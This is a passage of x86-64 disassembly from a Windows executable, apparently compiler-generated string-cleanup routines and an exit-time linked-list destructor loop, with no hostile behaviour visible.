   140009c3c:	33 d2                	xor    %edx,%edx
   140009c3e:	33 c9                	xor    %ecx,%ecx
   140009c40:	ff 15 d2 16 00 00    	call   *0x16d2(%rip)        # 0x14000b318
   140009c46:	cc                   	int3
   140009c47:	cc                   	int3
   140009c48:	cc                   	int3
   140009c49:	cc                   	int3
   140009c4a:	cc                   	int3
   140009c4b:	cc                   	int3
   140009c4c:	cc                   	int3
   140009c4d:	cc                   	int3
   140009c4e:	cc                   	int3
   140009c4f:	cc                   	int3
   140009c50:	48 83 ec 38          	sub    $0x38,%rsp
   140009c54:	48 8b 15 a5 d2 01 00 	mov    0x1d2a5(%rip),%rdx        # 0x140026f00
   140009c5b:	48 83 fa 0f          	cmp    $0xf,%rdx
   140009c5f:	76 30                	jbe    0x140009c91
   140009c61:	48 8b 0d 80 d2 01 00 	mov    0x1d280(%rip),%rcx        # 0x140026ee8
   140009c68:	48 ff c2             	inc    %rdx
   140009c6b:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140009c72:	72 18                	jb     0x140009c8c
   140009c74:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   140009c78:	48 83 c2 27          	add    $0x27,%rdx
   140009c7c:	48 2b c8             	sub    %rax,%rcx
   140009c7f:	48 83 e9 08          	sub    $0x8,%rcx
   140009c83:	48 83 f9 1f          	cmp    $0x1f,%rcx
   140009c87:	77 24                	ja     0x140009cad
   140009c89:	48 8b c8             	mov    %rax,%rcx
   140009c8c:	e8 6b eb ff ff       	call   0x1400087fc
   140009c91:	66 0f 6f 05 27 4e 00 	movdqa 0x4e27(%rip),%xmm0        # 0x14000eac0
   140009c98:	00 
   140009c99:	f3 0f 7f 05 57 d2 01 	movdqu %xmm0,0x1d257(%rip)        # 0x140026ef8
   140009ca0:	00 
   140009ca1:	c6 05 40 d2 01 00 00 	movb   $0x0,0x1d240(%rip)        # 0x140026ee8
   140009ca8:	48 83 c4 38          	add    $0x38,%rsp
   140009cac:	c3                   	ret
   140009cad:	45 33 c9             	xor    %r9d,%r9d
   140009cb0:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140009cb7:	00 00 
   140009cb9:	45 33 c0             	xor    %r8d,%r8d
   140009cbc:	33 d2                	xor    %edx,%edx
   140009cbe:	33 c9                	xor    %ecx,%ecx
   140009cc0:	ff 15 52 16 00 00    	call   *0x1652(%rip)        # 0x14000b318
   140009cc6:	cc                   	int3
   140009cc7:	cc                   	int3
   140009cc8:	cc                   	int3
   140009cc9:	cc                   	int3
   140009cca:	cc                   	int3
   140009ccb:	cc                   	int3
   140009ccc:	cc                   	int3
   140009ccd:	cc                   	int3
   140009cce:	cc                   	int3
   140009ccf:	cc                   	int3
   140009cd0:	48 83 ec 38          	sub    $0x38,%rsp
   140009cd4:	48 8b 15 45 d1 01 00 	mov    0x1d145(%rip),%rdx        # 0x140026e20
   140009cdb:	48 83 fa 0f          	cmp    $0xf,%rdx
   140009cdf:	76 30                	jbe    0x140009d11
   140009ce1:	48 8b 0d 20 d1 01 00 	mov    0x1d120(%rip),%rcx        # 0x140026e08
   140009ce8:	48 ff c2             	inc    %rdx
   140009ceb:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140009cf2:	72 18                	jb     0x140009d0c
   140009cf4:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   140009cf8:	48 83 c2 27          	add    $0x27,%rdx
   140009cfc:	48 2b c8             	sub    %rax,%rcx
   140009cff:	48 83 e9 08          	sub    $0x8,%rcx
   140009d03:	48 83 f9 1f          	cmp    $0x1f,%rcx
   140009d07:	77 24                	ja     0x140009d2d
   140009d09:	48 8b c8             	mov    %rax,%rcx
   140009d0c:	e8 eb ea ff ff       	call   0x1400087fc
   140009d11:	66 0f 6f 05 a7 4d 00 	movdqa 0x4da7(%rip),%xmm0        # 0x14000eac0
   140009d18:	00 
   140009d19:	f3 0f 7f 05 f7 d0 01 	movdqu %xmm0,0x1d0f7(%rip)        # 0x140026e18
   140009d20:	00 
   140009d21:	c6 05 e0 d0 01 00 00 	movb   $0x0,0x1d0e0(%rip)        # 0x140026e08
   140009d28:	48 83 c4 38          	add    $0x38,%rsp
   140009d2c:	c3                   	ret
   140009d2d:	45 33 c9             	xor    %r9d,%r9d
   140009d30:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140009d37:	00 00 
   140009d39:	45 33 c0             	xor    %r8d,%r8d
   140009d3c:	33 d2                	xor    %edx,%edx
   140009d3e:	33 c9                	xor    %ecx,%ecx
   140009d40:	ff 15 d2 15 00 00    	call   *0x15d2(%rip)        # 0x14000b318
   140009d46:	cc                   	int3
   140009d47:	cc                   	int3
   140009d48:	cc                   	int3
   140009d49:	cc                   	int3
   140009d4a:	cc                   	int3
   140009d4b:	cc                   	int3
   140009d4c:	cc                   	int3
   140009d4d:	cc                   	int3
   140009d4e:	cc                   	int3
   140009d4f:	cc                   	int3
   140009d50:	48 83 ec 38          	sub    $0x38,%rsp
   140009d54:	48 8b 15 05 d2 01 00 	mov    0x1d205(%rip),%rdx        # 0x140026f60
   140009d5b:	48 83 fa 0f          	cmp    $0xf,%rdx
   140009d5f:	76 30                	jbe    0x140009d91
   140009d61:	48 8b 0d e0 d1 01 00 	mov    0x1d1e0(%rip),%rcx        # 0x140026f48
   140009d68:	48 ff c2             	inc    %rdx
   140009d6b:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140009d72:	72 18                	jb     0x140009d8c
   140009d74:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   140009d78:	48 83 c2 27          	add    $0x27,%rdx
   140009d7c:	48 2b c8             	sub    %rax,%rcx
   140009d7f:	48 83 e9 08          	sub    $0x8,%rcx
   140009d83:	48 83 f9 1f          	cmp    $0x1f,%rcx
   140009d87:	77 24                	ja     0x140009dad
   140009d89:	48 8b c8             	mov    %rax,%rcx
   140009d8c:	e8 6b ea ff ff       	call   0x1400087fc
   140009d91:	66 0f 6f 05 27 4d 00 	movdqa 0x4d27(%rip),%xmm0        # 0x14000eac0
   140009d98:	00 
   140009d99:	f3 0f 7f 05 b7 d1 01 	movdqu %xmm0,0x1d1b7(%rip)        # 0x140026f58
   140009da0:	00 
   140009da1:	c6 05 a0 d1 01 00 00 	movb   $0x0,0x1d1a0(%rip)        # 0x140026f48
   140009da8:	48 83 c4 38          	add    $0x38,%rsp
   140009dac:	c3                   	ret
   140009dad:	45 33 c9             	xor    %r9d,%r9d
   140009db0:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140009db7:	00 00 
   140009db9:	45 33 c0             	xor    %r8d,%r8d
   140009dbc:	33 d2                	xor    %edx,%edx
   140009dbe:	33 c9                	xor    %ecx,%ecx
   140009dc0:	ff 15 52 15 00 00    	call   *0x1552(%rip)        # 0x14000b318
   140009dc6:	cc                   	int3
   140009dc7:	cc                   	int3
   140009dc8:	cc                   	int3
   140009dc9:	cc                   	int3
   140009dca:	cc                   	int3
   140009dcb:	cc                   	int3
   140009dcc:	cc                   	int3
   140009dcd:	cc                   	int3
   140009dce:	cc                   	int3
   140009dcf:	cc                   	int3
   140009dd0:	48 83 ec 38          	sub    $0x38,%rsp
   140009dd4:	48 8b 15 e5 d0 01 00 	mov    0x1d0e5(%rip),%rdx        # 0x140026ec0
   140009ddb:	48 83 fa 0f          	cmp    $0xf,%rdx
   140009ddf:	76 30                	jbe    0x140009e11
   140009de1:	48 8b 0d c0 d0 01 00 	mov    0x1d0c0(%rip),%rcx        # 0x140026ea8
   140009de8:	48 ff c2             	inc    %rdx
   140009deb:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140009df2:	72 18                	jb     0x140009e0c
   140009df4:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   140009df8:	48 83 c2 27          	add    $0x27,%rdx
   140009dfc:	48 2b c8             	sub    %rax,%rcx
   140009dff:	48 83 e9 08          	sub    $0x8,%rcx
   140009e03:	48 83 f9 1f          	cmp    $0x1f,%rcx
   140009e07:	77 24                	ja     0x140009e2d
   140009e09:	48 8b c8             	mov    %rax,%rcx
   140009e0c:	e8 eb e9 ff ff       	call   0x1400087fc
   140009e11:	66 0f 6f 05 a7 4c 00 	movdqa 0x4ca7(%rip),%xmm0        # 0x14000eac0
   140009e18:	00 
   140009e19:	f3 0f 7f 05 97 d0 01 	movdqu %xmm0,0x1d097(%rip)        # 0x140026eb8
   140009e20:	00 
   140009e21:	c6 05 80 d0 01 00 00 	movb   $0x0,0x1d080(%rip)        # 0x140026ea8
   140009e28:	48 83 c4 38          	add    $0x38,%rsp
   140009e2c:	c3                   	ret
   140009e2d:	45 33 c9             	xor    %r9d,%r9d
   140009e30:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140009e37:	00 00 
   140009e39:	45 33 c0             	xor    %r8d,%r8d
   140009e3c:	33 d2                	xor    %edx,%edx
   140009e3e:	33 c9                	xor    %ecx,%ecx
   140009e40:	ff 15 d2 14 00 00    	call   *0x14d2(%rip)        # 0x14000b318
   140009e46:	cc                   	int3
   140009e47:	cc                   	int3
   140009e48:	cc                   	int3
   140009e49:	cc                   	int3
   140009e4a:	cc                   	int3
   140009e4b:	cc                   	int3
   140009e4c:	cc                   	int3
   140009e4d:	cc                   	int3
   140009e4e:	cc                   	int3
   140009e4f:	cc                   	int3
   140009e50:	48 83 ec 38          	sub    $0x38,%rsp
   140009e54:	48 8b 15 25 d0 01 00 	mov    0x1d025(%rip),%rdx        # 0x140026e80
   140009e5b:	48 83 fa 0f          	cmp    $0xf,%rdx
   140009e5f:	76 30                	jbe    0x140009e91
   140009e61:	48 8b 0d 00 d0 01 00 	mov    0x1d000(%rip),%rcx        # 0x140026e68
   140009e68:	48 ff c2             	inc    %rdx
   140009e6b:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140009e72:	72 18                	jb     0x140009e8c
   140009e74:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   140009e78:	48 83 c2 27          	add    $0x27,%rdx
   140009e7c:	48 2b c8             	sub    %rax,%rcx
   140009e7f:	48 83 e9 08          	sub    $0x8,%rcx
   140009e83:	48 83 f9 1f          	cmp    $0x1f,%rcx
   140009e87:	77 24                	ja     0x140009ead
   140009e89:	48 8b c8             	mov    %rax,%rcx
   140009e8c:	e8 6b e9 ff ff       	call   0x1400087fc
   140009e91:	66 0f 6f 05 27 4c 00 	movdqa 0x4c27(%rip),%xmm0        # 0x14000eac0
   140009e98:	00 
   140009e99:	f3 0f 7f 05 d7 cf 01 	movdqu %xmm0,0x1cfd7(%rip)        # 0x140026e78
   140009ea0:	00 
   140009ea1:	c6 05 c0 cf 01 00 00 	movb   $0x0,0x1cfc0(%rip)        # 0x140026e68
   140009ea8:	48 83 c4 38          	add    $0x38,%rsp
   140009eac:	c3                   	ret
   140009ead:	45 33 c9             	xor    %r9d,%r9d
   140009eb0:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140009eb7:	00 00 
   140009eb9:	45 33 c0             	xor    %r8d,%r8d
   140009ebc:	33 d2                	xor    %edx,%edx
   140009ebe:	33 c9                	xor    %ecx,%ecx
   140009ec0:	ff 15 52 14 00 00    	call   *0x1452(%rip)        # 0x14000b318
   140009ec6:	cc                   	int3
   140009ec7:	cc                   	int3
   140009ec8:	cc                   	int3
   140009ec9:	cc                   	int3
   140009eca:	cc                   	int3
   140009ecb:	cc                   	int3
   140009ecc:	cc                   	int3
   140009ecd:	cc                   	int3
   140009ece:	cc                   	int3
   140009ecf:	cc                   	int3
   140009ed0:	48 83 ec 38          	sub    $0x38,%rsp
   140009ed4:	48 8b 15 45 d0 01 00 	mov    0x1d045(%rip),%rdx        # 0x140026f20
   140009edb:	48 83 fa 0f          	cmp    $0xf,%rdx
   140009edf:	76 30                	jbe    0x140009f11
   140009ee1:	48 8b 0d 20 d0 01 00 	mov    0x1d020(%rip),%rcx        # 0x140026f08
   140009ee8:	48 ff c2             	inc    %rdx
   140009eeb:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140009ef2:	72 18                	jb     0x140009f0c
   140009ef4:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   140009ef8:	48 83 c2 27          	add    $0x27,%rdx
   140009efc:	48 2b c8             	sub    %rax,%rcx
   140009eff:	48 83 e9 08          	sub    $0x8,%rcx
   140009f03:	48 83 f9 1f          	cmp    $0x1f,%rcx
   140009f07:	77 24                	ja     0x140009f2d
   140009f09:	48 8b c8             	mov    %rax,%rcx
   140009f0c:	e8 eb e8 ff ff       	call   0x1400087fc
   140009f11:	66 0f 6f 05 a7 4b 00 	movdqa 0x4ba7(%rip),%xmm0        # 0x14000eac0
   140009f18:	00 
   140009f19:	f3 0f 7f 05 f7 cf 01 	movdqu %xmm0,0x1cff7(%rip)        # 0x140026f18
   140009f20:	00 
   140009f21:	c6 05 e0 cf 01 00 00 	movb   $0x0,0x1cfe0(%rip)        # 0x140026f08
   140009f28:	48 83 c4 38          	add    $0x38,%rsp
   140009f2c:	c3                   	ret
   140009f2d:	45 33 c9             	xor    %r9d,%r9d
   140009f30:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140009f37:	00 00 
   140009f39:	45 33 c0             	xor    %r8d,%r8d
   140009f3c:	33 d2                	xor    %edx,%edx
   140009f3e:	33 c9                	xor    %ecx,%ecx
   140009f40:	ff 15 d2 13 00 00    	call   *0x13d2(%rip)        # 0x14000b318
   140009f46:	cc                   	int3
   140009f47:	cc                   	int3
   140009f48:	cc                   	int3
   140009f49:	cc                   	int3
   140009f4a:	cc                   	int3
   140009f4b:	cc                   	int3
   140009f4c:	cc                   	int3
   140009f4d:	cc                   	int3
   140009f4e:	cc                   	int3
   140009f4f:	cc                   	int3
   140009f50:	48 83 ec 38          	sub    $0x38,%rsp
   140009f54:	48 8b 15 05 cf 01 00 	mov    0x1cf05(%rip),%rdx        # 0x140026e60
   140009f5b:	48 83 fa 0f          	cmp    $0xf,%rdx
   140009f5f:	76 30                	jbe    0x140009f91
   140009f61:	48 8b 0d e0 ce 01 00 	mov    0x1cee0(%rip),%rcx        # 0x140026e48
   140009f68:	48 ff c2             	inc    %rdx
   140009f6b:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140009f72:	72 18                	jb     0x140009f8c
   140009f74:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   140009f78:	48 83 c2 27          	add    $0x27,%rdx
   140009f7c:	48 2b c8             	sub    %rax,%rcx
   140009f7f:	48 83 e9 08          	sub    $0x8,%rcx
   140009f83:	48 83 f9 1f          	cmp    $0x1f,%rcx
   140009f87:	77 24                	ja     0x140009fad
   140009f89:	48 8b c8             	mov    %rax,%rcx
   140009f8c:	e8 6b e8 ff ff       	call   0x1400087fc
   140009f91:	66 0f 6f 05 27 4b 00 	movdqa 0x4b27(%rip),%xmm0        # 0x14000eac0
   140009f98:	00 
   140009f99:	f3 0f 7f 05 b7 ce 01 	movdqu %xmm0,0x1ceb7(%rip)        # 0x140026e58
   140009fa0:	00 
   140009fa1:	c6 05 a0 ce 01 00 00 	movb   $0x0,0x1cea0(%rip)        # 0x140026e48
   140009fa8:	48 83 c4 38          	add    $0x38,%rsp
   140009fac:	c3                   	ret
   140009fad:	45 33 c9             	xor    %r9d,%r9d
   140009fb0:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140009fb7:	00 00 
   140009fb9:	45 33 c0             	xor    %r8d,%r8d
   140009fbc:	33 d2                	xor    %edx,%edx
   140009fbe:	33 c9                	xor    %ecx,%ecx
   140009fc0:	ff 15 52 13 00 00    	call   *0x1352(%rip)        # 0x14000b318
   140009fc6:	cc                   	int3
   140009fc7:	cc                   	int3
   140009fc8:	cc                   	int3
   140009fc9:	cc                   	int3
   140009fca:	cc                   	int3
   140009fcb:	cc                   	int3
   140009fcc:	cc                   	int3
   140009fcd:	cc                   	int3
   140009fce:	cc                   	int3
   140009fcf:	cc                   	int3
   140009fd0:	48 83 ec 38          	sub    $0x38,%rsp
   140009fd4:	48 8b 15 9d c4 01 00 	mov    0x1c49d(%rip),%rdx        # 0x140026478
   140009fdb:	48 83 fa 0f          	cmp    $0xf,%rdx
   140009fdf:	76 30                	jbe    0x14000a011
   140009fe1:	48 8b 0d 78 c4 01 00 	mov    0x1c478(%rip),%rcx        # 0x140026460
   140009fe8:	48 ff c2             	inc    %rdx
   140009feb:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140009ff2:	72 18                	jb     0x14000a00c
   140009ff4:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   140009ff8:	48 83 c2 27          	add    $0x27,%rdx
   140009ffc:	48 2b c8             	sub    %rax,%rcx
   140009fff:	48 83 e9 08          	sub    $0x8,%rcx
   14000a003:	48 83 f9 1f          	cmp    $0x1f,%rcx
   14000a007:	77 24                	ja     0x14000a02d
   14000a009:	48 8b c8             	mov    %rax,%rcx
   14000a00c:	e8 eb e7 ff ff       	call   0x1400087fc
   14000a011:	66 0f 6f 05 a7 4a 00 	movdqa 0x4aa7(%rip),%xmm0        # 0x14000eac0
   14000a018:	00 
   14000a019:	f3 0f 7f 05 4f c4 01 	movdqu %xmm0,0x1c44f(%rip)        # 0x140026470
   14000a020:	00 
   14000a021:	c6 05 38 c4 01 00 00 	movb   $0x0,0x1c438(%rip)        # 0x140026460
   14000a028:	48 83 c4 38          	add    $0x38,%rsp
   14000a02c:	c3                   	ret
   14000a02d:	45 33 c9             	xor    %r9d,%r9d
   14000a030:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   14000a037:	00 00 
   14000a039:	45 33 c0             	xor    %r8d,%r8d
   14000a03c:	33 d2                	xor    %edx,%edx
   14000a03e:	33 c9                	xor    %ecx,%ecx
   14000a040:	ff 15 d2 12 00 00    	call   *0x12d2(%rip)        # 0x14000b318
   14000a046:	cc                   	int3
   14000a047:	cc                   	int3
   14000a048:	40 53                	rex push %rbx
   14000a04a:	48 83 ec 20          	sub    $0x20,%rsp
   14000a04e:	eb 3d                	jmp    0x14000a08d
   14000a050:	48 8b 03             	mov    (%rbx),%rax
   14000a053:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   14000a057:	48 89 05 72 cd 01 00 	mov    %rax,0x1cd72(%rip)        # 0x140026dd0
   14000a05e:	48 8b 01             	mov    (%rcx),%rax
   14000a061:	48 8b 40 10          	mov    0x10(%rax),%rax
   14000a065:	ff 15 95 13 00 00    	call   *0x1395(%rip)        # 0x14000b400
   14000a06b:	48 8b c8             	mov    %rax,%rcx
   14000a06e:	48 85 c0             	test   %rax,%rax
   14000a071:	74 11                	je     0x14000a084
   14000a073:	48 8b 10             	mov    (%rax),%rdx
   14000a076:	48 8b 02             	mov    (%rdx),%rax
   14000a079:	ba 01 00 00 00       	mov    $0x1,%edx
   14000a07e:	ff 15 7c 13 00 00    	call   *0x137c(%rip)        # 0x14000b400
   14000a084:	48 8b cb             	mov    %rbx,%rcx
   14000a087:	ff 15 03 12 00 00    	call   *0x1203(%rip)        # 0x14000b290
   14000a08d:	48 8b 1d 3c cd 01 00 	mov    0x1cd3c(%rip),%rbx        # 0x140026dd0
   14000a094:	48 85 db             	test   %rbx,%rbx
   14000a097:	75 b7                	jne    0x14000a050
   14000a099:	48 83 c4 20          	add    $0x20,%rsp
   14000a09d:	5b                   	pop    %rbx
   14000a09e:	c3                   	ret
